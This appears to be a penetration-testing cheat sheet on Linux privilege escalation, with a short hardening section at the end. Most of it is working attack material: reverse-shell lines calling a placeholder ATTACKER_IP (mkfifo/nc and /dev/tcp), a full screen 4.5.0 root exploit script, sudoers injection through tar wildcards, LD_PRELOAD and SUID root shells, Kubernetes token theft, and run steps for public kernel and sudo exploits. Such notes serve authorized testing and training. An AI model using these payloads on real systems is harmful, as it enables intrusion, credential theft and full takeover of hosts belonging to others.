# Linux Privilege Escalation

## Introduction to Linux Privilege Escalation

Root gives full admin access on Linux. Escalating lets you capture traffic, read sensitive files, and if the host is domain joined, grab the NTLM hash to attack AD.

### Enumeration

Check OS/distro and kernel version for public exploits, services running as root for an easy misconfigured/vulnerable win (e.g. CVE-2016-9566, Nagios Core < 4.2.4), installed package versions (e.g. Screen 4.05.00), logged in users, and user home directories for SSH keys, configs and creds.

```bash
sudo -l # check current user's sudo rights, NOPASSWD entries show without a password
```

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # world-writable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # world-writable files
```

Check home directories and `~/.ssh` for private keys. Cross-reference the ARP cache against usable keys for lateral movement. Password hashes directly in `/etc/passwd` (uncommon, seen on embedded devices/routers) or a readable shadow file can be cracked offline.

## Environment Enumeration

Helper scripts like LinPEAS and LinEnum speed up enumeration, but manual checks matter for understanding what to look for and for when a script isn't available.

### Gaining Situational Awareness

- `whoami` - current user
- `id` - groups the user belongs to
- `hostname` - server name, may hint at naming convention
- `ifconfig` / `ip a` - current subnet, other NICs/subnets reachable
- `sudo -l` - sudo rights, easy win if NOPASSWD

Check `/etc/os-release` (or `/etc/lsb-release`) for distro and version, and whether it's still within its support window. Check `/etc/shells` for valid login shells, note if `tmux`/`screen` are present.

```bash
echo $PATH # note for later PATH abuse
env # check for sensitive values like passwords
uname -a # kernel version, search for a public exploit
```

Also check for defenses in place:

- Exec Shield
- iptables
- AppArmor
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (ufw)

```bash
lsblk # block devices, mount unmounted ones for backups/sensitive files
route # or netstat -rn, routing table for reachable subnets
arp -a # hosts the target has talked to
```

`lpstat` lists printers and queued print jobs, may hold sensitive data.

If the host uses internal DNS, `/etc/resolv.conf` can be a starting point to query the AD environment.

### Existing Users

`/etc/passwd` fields: username, password, UID, GID, GECOS, home dir, shell.

`$1$` MD5 | `$5$` SHA-256 | `$6$` SHA-512 | `$2a$` BCrypt | `$7$` Scrypt | `$argon2i$` Argon2

```bash
grep "sh$" /etc/passwd # users with login shells, check old bash (<4.1) for shellshock
```

### Existing Groups

`/etc/group` lists groups and their members.

```bash
getent group <GROUP> # list members of a group, e.g. sudo
```

### Mounted File Systems

```bash
df -h # mounted file systems, look for unusual mounts
```

### Unmounted File Systems

Grep `/etc/fstab` for creds (password, username, credential).

```bash
cat /etc/fstab | grep -v "#" | column -t # configured file systems, cleanly formatted
```

### All Hidden Files

```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
```

### All Hidden Directories

```bash
find / -type d -name ".*" -ls 2>/dev/null
```

### Temporary Files

`/tmp` clears on reboot and after 10 days. `/var/tmp` persists up to 30 days, used by programs needing data to survive a reboot.

## Linux Services & Internals Enumeration

Covers installed/running services, sockets, users/groups, password policy, AD join status, history/log/backup files, recently modified files (cron hijack clues), network info, and installed tools (netcat, python, nmap, gcc, etc.).

### Internals

#### Network Interfaces

Additional NICs can mean the host bridges into another subnet, useful for pivoting.

#### Hosts

Check `/etc/hosts` for internal hostnames that hint at other systems.

#### User's Last Login

```bash
lastlog # per-user last login time, shows usage patterns
```

#### Logged In Users

```bash
w # or who/finger, shows who else is on the system now
```

#### Command History

Review for passwords passed as args, git use, and cron setup.

#### Finding History Files

```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

#### Proc

procfs exposes process/kernel info, dynamically generated. Used to view process state, kernel params, memory, and devices.

```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" # full command lines, may leak creds passed as args
```

### Services

#### Installed Packages

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

#### Sudo Version

```bash
sudo -V # check for known sudo CVEs (e.g. CVE-2021-3156)
```

#### GTFObins

GTFOBins lists binaries exploitable to bypass restrictions, escalate privileges, spawn shells, or transfer files.

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```

GTFOBins: https://gtfobins.org

#### Trace System Calls

```bash
strace <COMMAND> # trace syscalls/signals, can reveal creds or tokens sent to remote hosts
```

#### Configuration Files

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

#### Scripts

```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

#### Running Services by User

A script run by root with loose write permissions can be edited and run without root access.

## Credential Hunting

Credentials can turn up in configs (`.conf`, `.config`, `.xml`), shell scripts, bash history, `.bak` backups, databases, or text files. Useful for escalating to other users/root or accessing other systems.

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php # example: WordPress DB creds
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Check the web root (typically under `/var`) and spool/mail directories for stored creds.

### SSH Keys

Check `known_hosts` for other targets a key's owner has connected to, useful for lateral movement.

## Path Abuse

PATH lists the directories searched for an executable by name instead of needing its full path. Check it with `echo $PATH` or `env | grep PATH`.

A script or program placed in a directory on PATH becomes runnable from anywhere on the system.

Adding `.` to PATH adds the current working directory to the search list, so a malicious file named like a common binary (e.g. `ls`) runs instead of the real one when just the name is typed.

```bash
PATH=.:${PATH}
export PATH
```

## Wildcard Abuse

Wildcards (`*`, `?`, `[ ]`, `~`, `-`) are interpreted by the shell before other actions. `tar`'s `--checkpoint-action` can run an arbitrary command when a wildcard passes crafted filenames as arguments.

```bash
echo 'echo "<USERNAME> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Exploits a cron job that runs `tar` with a wildcard (e.g. `tar -zcf backup.tar.gz *`) in a writable directory. On the next run the crafted filenames get parsed as `tar` options, executing `root.sh` as root.

```bash
sudo -l # confirm the new NOPASSWD entry after the cron job runs
```

## Escaping Restricted Shells

A restricted shell limits which commands or directories a user can access. Common types: `rbash`, `rksh`, `rzsh`.

### RBASH

Restricted Bourne shell. Blocks changing directories, modifying env vars, and running commands outside allowed directories.

### RKSH

Restricted Korn shell. Blocks running commands in other directories, defining/modifying shell functions, and modifying the shell environment.

### RZSH

Restricted Z shell. Blocks running scripts, defining aliases, and modifying the shell environment.

### Command injection

Inject a command into an argument the shell passes to an allowed builtin.

```bash
ls -l `pwd`
```

### Command Substitution

Run an unrestricted command inside backtick substitution syntax, if backticks aren't filtered.

### Command Chaining

Separate commands with a shell metacharacter (`;`, `|`) if the shell allows multiple commands per line.

### Environment Variables

Modify or create an environment variable the shell uses to decide where/what to execute, to point it somewhere unrestricted.

### Shell Functions

Define a shell function that runs an unrestricted command, if the shell allows defining and calling functions.

## Special Permissions

SETUID lets a binary run with the file owner's privileges (commonly root), shown as `s` in permissions. SETGID does the same for the group that created the binary.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null # SETUID binaries owned by root
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null # SETGID binaries owned by root
```

### GTFOBins

Curated list of binaries/scripts usable to bypass restrictions, escalate privileges, spawn shells, or transfer files.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh # example: apt-get breakout via Pre-Invoke
```

GTFOBins: https://gtfobins.org

## Sudo Rights Abuse

Sudo lets an account run specific commands as root (or another user) without switching users. Rights are set in `/etc/sudoers`. NOPASSWD entries show without needing a password.

```bash
sudo -l
```

### tcpdump postrotate-command

`tcpdump -z` runs a `postrotate-command` after each savefile rotation (used with `-C`/`-G`), usable to run an arbitrary script as root.

```bash
sudo /usr/sbin/tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Payload (`/tmp/.test`):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
```

AppArmor on newer distros predefines postrotate-command use, blocking this.

Gotcha: sudoers entries missing the absolute path to a binary (e.g. `cat` instead of `/bin/cat`) can be abused via PATH abuse.

## Privileged Groups

Certain group memberships (`lxd`, `docker`, `disk`, `adm`) grant privileges usable to reach root or read sensitive data.

### LXC / LXD

Ubuntu's container manager (similar to Docker). All users get added to the `lxd` group by default. Needs `lxd`/`lxc` group membership (check with `id`).

```bash
unzip alpine.zip
cd "64-bit Alpine/"
lxd init # accept defaults for each prompt
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true # no UID mapping, root in container = root on host
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

Mount is accessible at `/mnt/root` inside the container, giving root-level read/write of the host filesystem (e.g. `/etc/shadow`, SSH keys).

### Docker

Docker group membership is effectively root-level filesystem access without a password. Members can spawn containers mounting host directories.

```bash
docker run -v /root:/mnt -it ubuntu # mounts host /root at /mnt in the container
```

### Disk

`disk` group members have full access to devices in `/dev` (e.g. `/dev/sda1`). Can use `debugfs` to access the entire filesystem with root-level privileges.

### ADM

`adm` group members can read all logs in `/var/log`. Not direct root access, but can reveal sensitive data or cron job activity.

## Capabilities

Linux capabilities grant processes specific privileges (finer-grained than the traditional user/group model), but can be exploited if a process is poorly sandboxed or over-privileged.

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic # example: grant a capability to a binary
```

`cap_sys_admin` broad admin actions (modify system files/settings) | `cap_sys_chroot` change root dir | `cap_sys_ptrace` attach/debug other processes | `cap_sys_nice` raise/lower process priority | `cap_sys_time` modify system clock | `cap_sys_resource` modify resource limits | `cap_sys_module` load/unload kernel modules | `cap_net_bind_service` bind to network ports

`=` clears the capability | `+ep` effective+permitted | `+ei` effective+inheritable (children inherit) | `+p` permitted only (no inherit)

Capabilities usable to escalate to root: `cap_setuid` set effective UID (incl. root) | `cap_setgid` set effective GID | `cap_sys_admin` broad admin actions, mount/unmount | `cap_dac_override` bypass file read/write/execute permission checks

### Enumerating Capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation

`cap_dac_override` on a binary lets it bypass file permission checks.

```bash
getcap /usr/bin/vim.basic
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd # strip root's password field, then su with no password
```

## Vulnerable Services

Screen 4.5.0 has a privilege escalation vulnerability due to missing permission checks when opening a log file, letting an attacker truncate any file or create a root-owned file anywhere.

```bash
screen -v # check screen version
```

Full PoC (`screen_exploit_poc.sh`):

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Cron Job Abuse

Cron entries: minute, hour, day, month, weekday, command. Root's crontab is normally root-only, but a world-writable script it runs, or a misconfigured /etc/cron.d entry, can still be abused.

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # look for writable files, incl. cron-run scripts
```

A world-writable script run by a cron job can have a command appended to its end (e.g. a reverse shell) to run next execution. Confirm timing/behavior with `pspy` (no root needed, scans procfs).

```bash
./pspy64 -pf -i 1000 # -pf print commands+fs events, -i 1000 scan every 1000ms
```

Append to the vulnerable script, keeping its original function intact:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
## Containers

Containers isolate processes at the OS level (shared kernel); VMs virtualize hardware. Isolates privileged processes (e.g. web apps/APIs) from the host.

### Linux Containers (LXC)

OS-level virtualization running multiple isolated Linux systems that share one host kernel.

### Linux Daemon (LXD)

Contains a full OS (system container), unlike LXC's app containers. Needs `lxd`/`lxc` group membership. Uses the same privileged-container technique as the Privileged Groups section; if a container template already exists on the target, import and use it directly:

```bash
lxc image import <TEMPLATE>.tar.xz --alias <ALIAS>
lxc image list
```

Then `lxc init <ALIAS> <NAME> -c security.privileged=true`, mount `/` into the container, start it, and exec in as before.

## Docker

Client-server model: Docker client issues commands, Docker daemon executes them and manages containers, images, networking and volumes.

### Docker Privilege Escalation

#### Shared Directories

Containers may have non-standard host directories bind-mounted in. Check for an SSH key under a mounted host path and use it to log back in as that user.

```bash
ssh <USERNAME>@<TARGET_IP> -i <KEY_FILE>
```

#### Docker Sockets

A Docker socket (often `/var/run/docker.sock`, sometimes exposed elsewhere) lets a client talk to the daemon.

```bash
wget http://<ATTACKER_IP>/docker -O docker # get docker binary if not installed
chmod +x docker
./docker -H unix://<SOCKET_PATH> ps
./docker -H unix://<SOCKET_PATH> run --rm -d --privileged -v /:/hostsystem <IMAGE> # mount host / into new container
./docker -H unix://<SOCKET_PATH> exec -it <CONTAINER_ID> /bin/bash
```

#### Docker Group

Membership in `docker` group gives root-equivalent host access without a password (also applies if docker has SUID set or the user is a sudoer for docker).

```bash
id # confirm docker group
docker image ls
```

#### Writable Docker Socket

If `/var/run/docker.sock` is writable by a user outside root/docker group, it can still be abused.

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Kubernetes

Container orchestration platform. Control Plane manages the cluster; Worker Nodes (Minions) run pods via kubelet. A pod holds one or more containers.

`etcd` 2379,2380 | `API server` 6443 | `Scheduler` 10251 | `Controller Manager` 10252 | `Kubelet API` 10250 | `Read-Only Kubelet API` 10255

Kubelet allows anonymous access by default; unauthenticated requests are treated as `system:anonymous`.

```bash
curl https://<TARGET_IP>:6443 -k # API server
curl https://<TARGET_IP>:10250/pods -k | jq . # kubelet API, list pods (may leak config/secrets)
```

### kubeletctl

Interacts with the kubelet API to list and exec against pods.

```bash
kubeletctl -i --server <TARGET_IP> pods # list pods
kubeletctl -i --server <TARGET_IP> scan rce # find pods vulnerable to RCE
kubeletctl -i --server <TARGET_IP> exec "<CMD>" -p <POD> -c <CONTAINER> # run a command in a pod/container
```

### Privilege Escalation

Extract the pod's service account token and CA cert to authenticate as it against the API server.

```bash
kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token
kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER> | tee -a ca.crt
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list # check granted permissions
```

If able to create/list pods, deploy a pod mounting the host root filesystem:

```text
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 apply -f privesc.yaml
kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc # read host root's SSH key
```

## Logrotate

Archives/rotates log files on schedule (size, age) via cron, controlled by `/etc/logrotate.conf` and `/etc/logrotate.d/`.

`-d` debug, no changes | `-f` force rotation | `-m` mail command | `-s` state file path | `--skip-state-lock` | `-v` verbose | `-l` log file or syslog

Requirements: write permission on the log file, logrotate runs as a privileged user/root, vulnerable version (3.8.6, 3.11.0, 3.15.0, 3.18.0).

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#" # confirm which option logrotate uses, exploit must match
./logrotten -p ./payload <TARGET_FILE>
```

## Miscellaneous Techniques

### Passive Traffic Capture

If `tcpdump` is available to an unprivileged user, cleartext creds (HTTP, FTP, POP, IMAP, telnet, SMTP) or hashes (Net-NTLMv2, SMBv2, Kerberos) may be captured. Tools: net-creds, PCredz.

### Weak NFS Privileges

NFS shares files over the network, port 2049.

```bash
showmount -e <TARGET_IP> # list NFS exports
```

`root_squash` remaps root to `nfsnobody`, blocking SUID uploads | `no_root_squash` lets a remote root create files as root, SUID included

Create a SUID shell on the attack box, mount the NFS export locally, copy it in and set the bit:

```text
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
gcc shell.c -o shell
sudo mount -t nfs <TARGET_IP>:<SHARE> /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

Run the SUID binary from the low-privileged session on the target to get root.

### Hijacking Tmux Sessions

A tmux session left running as a privileged user with weak socket permissions can be attached to by another group member.

```bash
tmux -S <SOCK_PATH> new -s <SESSION> # create shared session, as the privileged user
chown root:<GROUP> <SOCK_PATH>
```

```bash
tmux -S <SOCK_PATH> # attach, as a member of the owning group
```

## Kernel Exploits

Public exploits exist for many kernel versions (e.g. Dirty COW, CVE-2016-5195).

```bash
uname -a # kernel version, search for a matching public exploit
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

Gotcha: can cause instability/crashes on production systems.

## Shared Libraries

Dynamic libraries (`.so`) can be swapped to control program execution, unlike static libraries (`.a`) which are baked into the binary at compile time.

```bash
ldd <BINARY> # list a binary's required shared libraries
```

Search order: `-rpath`/`-rpath-link` at compile time, `LD_RUN_PATH`/`LD_LIBRARY_PATH` env vars, default `/lib`/`/usr/lib`, or `/etc/ld.so.conf`. `LD_PRELOAD` loads a library before the binary runs, ahead of defaults.

### LD_PRELOAD Privilege Escalation

Needs a sudoers entry for a command that keeps `LD_PRELOAD` (`env_keep+=LD_PRELOAD`).

```text
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so <ALLOWED_SUDO_COMMAND>
```

## Shared Object Hijacking

A SETUID binary linking a non-standard library via a writable RUNPATH can have that library replaced.

```bash
ldd <BINARY> # find the non-standard library path
readelf -d <BINARY> | grep PATH # confirm writable RUNPATH
```

Copy an existing library in to find the missing symbol name from the resulting error, then build a replacement exporting that function:

```text
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void <FUNCTION_NAME>() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o <RUNPATH_DIR>/<LIBRARY_NAME>
```

Run the SETUID binary again to get a root shell.

## Python Library Hijacking

Python imports modules via `import`, wildcard import, or named import. Three attack vectors: insecure module write permissions, library search path priority, and the `PYTHONPATH` env var.

### Insecure Write Permissions

A world-writable module imported by a script runnable as root (via sudo) lets you inject code into it.

```bash
sudo -l # check for NOPASSWD script run as root
ls -l <SCRIPT>.py # SUID has no effect on interpreted scripts, rely on sudo instead
grep -r "def <FUNCTION_NAME>" <SITE_PACKAGES_PATH>/* # find the module source defining the imported function
ls -l <MODULE_PATH> # check for world-writable module file
```

Insert code at the start of the target function in the module:

```python
import os
os.system('id')
```

```bash
sudo /usr/bin/python3 <SCRIPT>.py # re-run to trigger injected code as root
```

### Python Library Search Path

Requires the imported module to sit in a lower-priority path, and a higher-priority path to be writable.

```bash
python3 -c 'import sys; print("\n".join(sys.path))' # search order, higher = higher priority
pip3 show <MODULE> # find the module's real install location
```

Create a same-named module with a same-named, same-arity function in the writable higher-priority path:

```python
#!/usr/bin/env python3

import os

def <FUNCTION_NAME>():
    os.system('id')
```

```bash
sudo /usr/bin/python3 <SCRIPT>.py
```

### PYTHONPATH Environment Variable

Needs sudo rights on the python binary with `SETENV` (env vars aren't restricted under sudo's trusted context).

```bash
sudo -l # look for SETENV: NOPASSWD: /usr/bin/python3
sudo PYTHONPATH=<WRITABLE_DIR> /usr/bin/python3 <SCRIPT>.py # forces import from a controlled directory
```

## Sudo

`/etc/sudoers` controls which users/groups can run which commands as which users.

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d' # view sudoers rules, requires password
```

### CVE-2021-3156 (Baron Samedit)

Heap-based buffer overflow. Affects sudo 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), and others.

```bash
sudo -V | head -n1 # check sudo version
cat /etc/lsb-release # confirm OS/version for exploit target selection
```

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <TARGET_INDEX> # lists available OS targets if run with no args
```

### Sudo Policy Bypass (CVE-2019-14287)

Affects sudo < 1.8.28. Requires a sudoers entry allowing a specific command as a named (non-root) user.

```bash
sudo -l # confirm e.g. ALL=(ALL) /usr/bin/id
cat /etc/passwd | grep <USERNAME> # find target UID
sudo -u#-1 <COMMAND> # UID -1 resolves to 0 (root)
```

## Polkit

Authorization service mediating whether software can perform privileged actions. Config in `/usr/share/polkit-1/actions` (policies) and `/usr/share/polkit-1/rules.d` (rules); local overrides in `/etc/polkit-1/localauthority/50-local.d/*.pkla`.

`pkexec` run a command as another user/root | `pkaction` list actions | `pkcheck` check if a process is authorized for an action

```bash
pkexec -u <USERNAME> <COMMAND>
```

### CVE-2021-4034 (PwnKit)

Memory corruption in `pkexec`.

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

## Dirty Pipe (CVE-2022-0847)

Allows writing to files the user only has read access to, via a pipe-based kernel bug. Affects kernels 5.8-5.17. Similar to Dirty COW.

```bash
uname -r # confirm vulnerable kernel version
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

```bash
./exploit-1 # backs up and edits /etc/passwd to drop root's password, then pops a root shell
```

```bash
find / -perm -4000 2>/dev/null # find a SUID binary to target
./exploit-2 /usr/bin/sudo # hijacks a SUID binary to pop a root shell via it
```

## Netfilter

Linux kernel module for packet filtering, NAT, and connection tracking; backs `iptables`/`arptables`.

- Packet defragmentation
- Connection tracking
- Network address translation (NAT)

### CVE-2021-22555

Vulnerable kernels: 2.6-5.11.

```bash
uname -r
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

### CVE-2022-25636

Affects kernel 5.4-5.6.10 (`net/netfilter/nf_dup_netdev.c`, heap out-of-bounds write).

```bash
uname -r
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

Gotcha: can corrupt the kernel and require a reboot to regain access.

### CVE-2023-32233

Use-after-free in nf_tables anonymous sets, kernel up to 6.3.1.

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

## Linux Hardening

Proper hardening can eliminate most opportunities for local privilege escalation.

### Updates and Patching

`unattended-upgrades` (Debian/Ubuntu) or `yum-cron` (RHEL) automate patching to close known-vulnerable kernel/service exploits.

### Configuration Management

- Audit writable files/dirs and SUID binaries.
- Specify absolute paths in cron jobs and sudoers entries.
- No cleartext credentials in world-readable files.
- Clean up home directories and bash history.
- Restrict write access to libraries called by privileged programs.
- Remove unneeded packages/services.
- Consider SELinux.

### User Management

Limit user/admin accounts, log logon attempts, enforce strong passphrases over forced rotation, prevent password reuse via `/etc/security/opasswd` with PAM, avoid excessive group membership, apply least privilege to sudo rights.

### Audit

Lynis audits Unix system configuration and gives hardening suggestions.

```bash
./lynis audit system
```